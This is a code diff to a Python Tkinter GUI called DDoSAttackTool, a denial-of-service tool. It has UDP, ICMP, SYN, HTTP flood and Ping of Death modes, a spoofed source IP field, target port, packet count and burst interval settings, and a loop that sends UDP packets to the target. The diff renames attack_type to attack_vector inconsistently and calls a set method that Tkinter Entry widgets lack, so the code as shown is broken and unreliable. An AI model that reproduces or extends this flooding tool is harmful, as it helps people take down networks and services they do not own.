@@ -18,13 +18,14 @@ class DDoSAttackTool:
         self.target_text = tk.Text(self.root, height=5, width=30)
         self.fake_ip_entry = tk.Entry(self.root)
         self.port_entry = tk.Entry(self.root)
+        self.port_entry.set("80")
         self.num_packets_entry = tk.Entry(self.root)
         self.burst_interval_entry = tk.Entry(self.root)
-        self.attack_type_entry = tk.StringVar(self.root)
-        self.attack_type_entry.set("UDP Flood")
+        self.attack_vector_entry = tk.StringVar(self.root)
+        self.attack_vector_entry.set("UDP Flood")
 
-        self.attack_types = [
-            "UDP Flood", "ICMP Echo", "SYN Flood", "HTTP Flood", "Ping of Death"
+        self.attack_vectors = [
+            "UDP Flood", "ICMP Echo", "SYN Flood", "HTTP Flood", "PoD Attack"
         ]
 
         self.attack_num = 0
@@ -40,7 +41,7 @@ class DDoSAttackTool:
         tk.Label(self.root, text="Enter The Spoofed IP Address").pack()
         self.fake_ip_entry.pack()
 
-        tk.Label(self.root, text="Enter The Port Number").pack()
+        tk.Label(self.root, text="Enter The Target's Port Number").pack()
         self.port_entry.pack()
 
         tk.Label(self.root, text="Enter Number of Packets to Send").pack()
@@ -49,7 +50,7 @@ class DDoSAttackTool:
         tk.Label(self.root, text="Enter Burst Interval (in seconds)").pack()
         self.burst_interval_entry.pack()
 
-        tk.Label(self.root, text="Select Attack Type").pack()
+        tk.Label(self.root, text="Select Attack Vector").pack()
         attack_type_menu = tk.OptionMenu(self.root, self.attack_type_entry, *self.attack_types)
         attack_type_menu.pack()
 
@@ -71,25 +72,25 @@ class DDoSAttackTool:
         port = int(self.port_entry.get())
         num_packets = int(self.num_packets_entry.get())
         burst_interval = float(self.burst_interval_entry.get())
-        attack_type = self.attack_type_entry.get()
+        attack_type = self.attack_vector_entry.get()
 
-        if attack_type == "UDP Flood":
+        if attack_vector == "UDP Flood":
             attack_thread = threading.Thread(target=self.udp_flood_attack,
                                              args=(target_ips, port, num_packets, burst_interval))
-        elif attack_type == "ICMP Echo":
+        elif attack_vector == "ICMP Echo":
             attack_thread = threading.Thread(target=self.icmp_echo_attack,
                                              args=(target_ips, num_packets, burst_interval))
-        elif attack_type == "SYN Flood":
+        elif attack_vector == "SYN Flood":
             attack_thread = threading.Thread(target=self.syn_flood_attack,
                                              args=(target_ips, port, num_packets, burst_interval))
-        elif attack_type == "HTTP Flood":
+        elif attack_vector == "HTTP Flood":
             attack_thread = threading.Thread(target=self.http_flood_attack,
                                              args=(target_ips, port, num_packets, burst_interval))
-        elif attack_type == "Ping of Death":
+        elif attack_vector == "PoD Attack":
             attack_thread = threading.Thread(target=self.ping_of_death_attack,
                                              args=(target_ips, num_packets, burst_interval))
         else:
-            print("Invalid attack type selected.")
+            print("Invalid attack vector selected.")
             return
 
         attack_thread.start()
@@ -97,7 +98,6 @@ class DDoSAttackTool:
         self.attack_start_time = time.time()
         self.total_bytes_sent = 0
 
-        # Update the attack status label
         self.attack_status_label.config(text="Attack Status: In Progress")
         self.root.update()
 
@@ -106,17 +106,14 @@ class DDoSAttackTool:
                 if self.stop_attack_flag:
                     break
                 executor.submit(attack_function, target, port, num_packets, burst_interval)
-                time.sleep(1)  # Check the flag every second
+                time.sleep(1)  
 
-                # Update the attack speed label
                 self.attack_speed_label.config(text=f"Attack Speed: {self.get_attack_speed():.2f} GB/s")
                 self.root.update()
 
-                # Increment the progress bar value
                 self.progress_bar["value"] += 1
                 self.root.update()
 
-        # Update the attack status label
         self.attack_status_label.config(text="Attack Status: Not in Progress")
         self.root.update()
 
@@ -141,15 +138,15 @@ class DDoSAttackTool:
         return target_ips
 
     def get_attack_function(self, attack_type):
-        if attack_type == "UDP Flood":
+        if attack_vector == "UDP Flood":
             return self.udp_flood_attack
-        elif attack_type == "ICMP Echo":
+        elif attack_vector == "ICMP Echo":
             return self.icmp_echo_attack
-        elif attack_type == "SYN Flood":
+        elif attack_vector == "SYN Flood":
             return self.syn_flood_attack
-        elif attack_type == "HTTP Flood":
+        elif attack_vector == "HTTP Flood":
             return self.http_flood_attack
-        elif attack_type == "Ping of Death":
+        elif attack_vector == "PoD Attack":
             return self.ping_of_death_attack
         else:
             print("Invalid attack type selected.")
@@ -163,7 +160,7 @@ class DDoSAttackTool:
             for _ in range(num_packets):
                 sock.sendto(packet_data, (target_ip, port))
                 self.attack_num += 1
-                packet_size = len(packet_data)  # Replace b"" with the actual packet data
+                packet_size = len(packet_data) 
                 self.total_bytes_sent += packet_size
                 print(f"Sent {self.attack_num} packet to {target_ip} through port: {port}")
                 time.sleep(burst_interval)
